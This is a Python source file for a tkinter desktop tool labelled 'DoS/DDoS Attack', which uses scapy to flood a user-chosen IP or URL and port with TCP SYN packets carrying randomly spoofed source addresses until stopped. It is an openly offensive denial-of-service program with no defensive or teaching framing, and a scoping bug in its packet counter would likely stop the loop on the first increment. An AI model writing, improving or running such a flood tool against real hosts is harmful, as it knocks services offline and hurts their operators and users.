import tkinter as tk
from tkinter import ttk
import socket
from urllib.parse import urlparse
from scapy.all import send, IP, TCP
import random
import threading

root = tk.Tk()
root.geometry("500x500")
root.title("DoS/DDoS Attack")

# Global flag to control attack state
attack_running = False
attack_thread = None

#Validation for number in input field
def only_numbers(char):
    return char.isdigit() or char == ""
vcmd = (root.register(only_numbers), "%P")

menu = tk.Frame(root, bg="#2c2c2c", width=150)
menu.pack(side="left", fill="y")

content = tk.Frame(root, bg="#1e1e1e")
content.pack(side="right", fill="both", expand=True)

syn_flood = tk.Frame(content, bg="#1e1e1e")
home = tk.Frame(content, bg="#1e1e1e")

for page in (syn_flood, home):
    page.place(relwidth=1, relheight=1)

def show_page(page):
    page.tkraise()

def syn_flood_attack():
    global attack_running, attack_thread
    
    # Don't start if already running
    if attack_running:
        return
        
    target_input = target_inp.get()
    target_port = int(port_inp.get())
    ip = target_input
    packet_sent = 0
    
    try:
        hostname = urlparse(target_input).hostname
        if hostname:
            ip = socket.gethostbyname(hostname)
        else:
            print("Invalid target")
            return
            
        attack_running = True
        
        # Run attack in separate thread to keep GUI responsive
        def attack_loop():
            global attack_running
            try:
                while attack_running:
                    source_IP = f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                    source_port = random.randint(0, 65535)
                    ip_packet = IP(src=source_IP, dst=ip)
                    tcp = TCP(sport=source_port, dport=target_port, flags="S")
                    packet = ip_packet/tcp

                    send(packet, verbose=False)
                    packet_sent += 1
                    if packet_sent % 100 == 0:  # Update every 100 packets
                        print(f"{packet_sent} Packets Sent")
            except Exception as e:
                print(f"Error in attack loop: {e}")
            finally:
                attack_running = False
                print(f"Attack stopped. Total packets sent: {packet_sent}")
                
        attack_thread = threading.Thread(target=attack_loop)
        attack_thread.daemon = True
        attack_thread.start()
        
    except Exception as e:
        print(f"Error: {e}")
        attack_running = False

def stop_attack():
    global attack_running
    attack_running = False
    print("Stopping attack...")

btn1 = tk.Button(menu, text="home", command=lambda: show_page(home))
btn1.pack(fill="x", pady=5)
btn2 = tk.Button(menu, text="SynFlood", command=lambda: show_page(syn_flood))
btn2.pack(fill="x", pady=5)

tk.Label(home, text="This is Home", fg="white", bg="#1e1e1e").pack(pady=20)

# region syn flood UI
target_label = tk.Label(syn_flood, text="Target Ip", fg="white", bg="#1e1e1e")
target_inp = tk.Entry(syn_flood, background="#333333", fg="white")
target_label.pack(padx=10, pady=5)
target_inp.pack(padx=10, pady=5)
target_note = tk.Label(syn_flood, text="Target machine's IP address or url", fg="gray", bg="#1e1e1e")
target_note.pack()

port_label = tk.Label(syn_flood, text="Port number", fg="white", bg="#1e1e1e")
port_inp = tk.Entry(syn_flood, background="#333333", fg="white", validate="key", validatecommand=vcmd)
port_label.pack(padx=10, pady=5)
port_inp.pack(padx=10, pady=5)
port_inp.insert(0, "80")  # Default port

# Button frame for better layout
button_frame = tk.Frame(syn_flood, bg="#1e1e1e")
button_frame.pack(pady=20)

start_btn = tk.Button(button_frame, text="Start Attack", command=syn_flood_attack, bg="#d32f2f", fg="white", width=15)
start_btn.pack(side="left", padx=5)

stop_btn = tk.Button(button_frame, text="Stop Attack", command=stop_attack, bg="#388e3c", fg="white", width=15)
stop_btn.pack(side="left", padx=5)

# Status label
status_label = tk.Label(syn_flood, text="Ready", fg="green", bg="#1e1e1e")
status_label.pack(pady=10)
# endregion

show_page(home)
root.mainloop()